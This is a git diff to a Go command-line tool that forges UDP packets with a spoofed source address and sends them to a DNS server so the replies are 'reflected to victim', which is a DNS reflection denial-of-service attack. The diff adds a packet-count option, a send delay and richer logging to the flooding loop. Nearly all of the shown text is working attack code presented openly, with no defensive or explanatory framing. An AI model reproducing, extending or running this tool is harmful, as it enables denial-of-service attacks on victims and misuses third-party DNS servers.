@@ -7,6 +7,7 @@ import (
 	"os"
 	"strconv"
 	"syscall"
+	"time"
 
 	"github.com/akamensky/argparse"
 	"github.com/google/gopacket"
@@ -17,8 +18,8 @@ import (
 
 var logger zerolog.Logger
 
-func sendLogger(victim string, dns string, dns_port int) {
-	logger.Info().Str("Sent several packets to ", dns).Int("port", dns_port).Str("That got reflected to victim ", victim).Msg("Successfully")
+func sendLogger(victim string, victim_port int, dns string, dns_port int, number int) {
+	logger.Info().Int("Sent", number).Str(" packets to ", dns).Int("port", dns_port).Str("That got reflected to victim ", victim).Int("Through port", victim_port).Msg("Successfully")
 }
 
 func create_packet(victim string, victim_port int, dns string, dns_port int) ([]byte, error) {
@@ -66,7 +67,7 @@ func create_packet(victim string, victim_port int, dns string, dns_port int) ([]
 	return buffer.Bytes(), nil
 }
 
-func send_requests(packet []byte, victim string, dns string, dns_port int, iface string) {
+func send_requests(packet []byte, victim string, victim_port int, dns string, dns_port int, iface string, number int) {
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
 	if err != nil {
 		logger.Error().Err(err).Msg("Failed to create socket")
@@ -80,7 +81,7 @@ func send_requests(packet []byte, victim string, dns string, dns_port int, iface
 		return
 	}
 
-	for i := 0; i < 1000000; i++ {
+	for i := 0; i < number; i++ {
 		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
 			Port: dns_port,
 			Addr: [4]byte(net.ParseIP(dns).To4()),
@@ -89,8 +90,9 @@ func send_requests(packet []byte, victim string, dns string, dns_port int, iface
 			logger.Error().Err(err).Msg("Failed to send packet")
 			return
 		}
+		time.Sleep(20 * time.Millisecond)
 	}
-	sendLogger(victim, dns, dns_port)
+	sendLogger(victim, victim_port, dns, dns_port, number)
 }
 
 func main() {
@@ -207,10 +209,34 @@ func main() {
 		},
 	})
 
+	number := parser.Int("n", "number", &argparse.Options{
+		Required: true,
+		Help:     "Number of packets to send",
+		Default:  10000,
+		Validate: func(args []string) error {
+			val, err := strconv.Atoi(args[0])
+			if err != nil {
+				return errors.New("must be a number")
+			}
+
+			if val < 0 {
+				return errors.New("must be greater than 0")
+			}
+			return nil
+		},
+	})
+
+	if err := parser.Parse(os.Args); err != nil {
+		logger.Fatal().
+			Err(err).
+			Msg("Error parsing arguments")
+		return
+	}
+
 	packet, err := create_packet(*victim, *victim_port, *dns_server, *dns_port)
 	if err != nil {
 		logger.Error().Err(err).Msg("Failed to create packet")
 		return
 	}
-	send_requests(packet, *victim, *dns_server, *dns_port, *iface)
+	send_requests(packet, *victim, *victim_port, *dns_server, *dns_port, *iface, *number)
 }
